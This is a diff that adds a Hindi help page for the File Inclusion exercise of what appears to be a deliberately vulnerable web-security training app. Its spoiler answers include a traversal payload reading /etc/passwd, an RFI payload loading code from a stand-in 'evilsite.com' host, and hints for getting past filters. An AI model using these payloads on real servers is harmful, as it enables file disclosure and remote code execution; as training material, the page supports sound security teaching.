@@ -1,0 +1,66 @@
+<div class="body_padded">
+	<h1>Help - File Inclusion</h1>
+
+	<div id="code">
+	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
+	<tr>
+	<td><div id="code">
+		<h3>परिचय (About)</h3>
+		<p>कुछ वेब ऐप्लिकेशंस उपयोगकर्ता को ऐसा इनपुट देने की अनुमति देते हैं जो सीधे फ़ाइल स्ट्रीम में उपयोग किया जाता है या उपयोगकर्ता को सर्वर पर फ़ाइलें अपलोड करने की अनुमति देता है।
+			बाद में वेब ऐप्लिकेशन वेब ऐप्लिकेशन के संदर्भ में उपयोगकर्ता द्वारा प्रदान किए गए इनपुट तक पहुँचता है। ऐसा करके, वेब ऐप्लिकेशन 
+			दुर्भावनापूर्ण फ़ाइल निष्पादन की संभावना को अनुमति दे रहा है.</p>
+
+		<p>यदि शामिल करने के लिए चुनी गई फ़ाइल टारगेट मशीन पर स्थानीय (local) है, तो इसे "Local File Inclusion (LFI)" कहा जाता है। लेकिन फ़ाइलें अन्य मशीनों पर भी शामिल की जा सकती हैं, 
+			ऐसी स्थिति में उस अटैक को "Remote File Inclusion (RFI)" कहा जाता है।</p>
+
+		<p>जब RFI कोई विकल्प न हो, तो LFI के साथ किसी अन्य vulnerability (जैसे फ़ाइल अपलोड और डायरेक्टरी ट्रैवर्सल) का उपयोग करके अक्सर वही प्रभाव प्राप्त किया जा सकता है।</p>
+
+		<p>ध्यान दें, "file inclusion" शब्द "arbitrary file access" या "file disclosure" के समान नहीं है।</p>
+
+		<br /><hr /><br />
+
+		<h3>उद्देश्य (Objective)</h3>
+		<p>केवल file inclusion का उपयोग करके '<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>' से सभी <u>पाँच</u> प्रसिद्ध कोट्स (quotes) पढ़ें।</p>
+
+		<br /><hr /><br />
+
+		<h3>Low Level</h3>
+		<p>यह <u>कई PHP फ़ंक्शंस में से किसी एक</u> में सीधे इनपुट की अनुमति देता है जो निष्पादित होने पर सामग्री को शामिल (include) कर लेगा।</p>
+
+		<p>वेब सर्विस कॉन्फ़िगरेशन पर निर्भर करेगा कि क्या RFI की संभावना है या नहीं।</p>
+		<pre>Spoiler (जवाब): <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
+			Spoiler (जवाब): <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>
+
+		<br />
+
+		<h3>Medium Level</h3>
+		<p>डेलवपर ने LFI/RFI से जुड़ी कुछ समस्याओं के बारे में पढ़ा है, और इनपुट को फ़िल्टर करने का निर्णय लिया है। हालाँकि, जिन पैटर्न का उपयोग किया जाता है, वे पर्याप्त नहीं हैं।</p>
+		<pre>Spoiler (जवाब): <span class="spoiler">LFI: Possible, due to it only cycling through the pattern matching once</span>.
+			Spoiler (जवाब): <span class="spoiler">RFI: <a href="https://secure.php.net/manual/en/wrappers.php" target="_blank">PHP Streams</a></span>.</pre>
+
+		<br />
+
+		<h3>High Level</h3>
+		<p>डेलवपर परेशान हो चुका है। उन्होंने केवल कुछ निश्चित फ़ाइलों का ही उपयोग करने की अनुमति देने का निर्णय लिया है। हालाँकि चूंकि समान बेसनाम (basename) वाली कई फ़ाइलें हैं, 
+			इसलिए वे उन सभी को शामिल करने के लिए वाइल्डकार्ड (wildcard) का उपयोग करते हैं।</p>
+		<pre>Spoiler (जवाब): <span class="spoiler">LFI: The filename only has start with a certain value.</span>.
+			Spoiler (जवाब): <span class="spoiler">RFI: Need to link in another vulnerability, such as file upload</span>.</pre>
+
+		<br />
+
+		<h3>Impossible Level</h3>
+		<p>डेलवपर हार मान लेता है और उनकी सटीक फ़ाइल नामों के साथ केवल अनुमति प्राप्त पृष्ठों (allowed pages) को हार्डकोड कर देता है। ऐसा करके, यह अटैक के सभी रास्तों को समाप्त कर देता है।</p>
+	</div></td>
+	</tr>
+	</table>
+
+	</div>
+
+	<br />
+
+	<p>संदर्भ (Reference): <a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank">Wikipedia - File inclusion vulnerability</a></p>
+	<p>संदर्भ (Reference): <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" target="_blank">WSTG - Local File Inclusion</a></p>
+	<p>संदर्भ (Reference): <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank">WSTG - Remote File Inclusion</a></p>
+	<p>संदर्भ (Reference): <a href="https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion" target="_blank">PHP File Inclusion</a></p>
+
+</div>
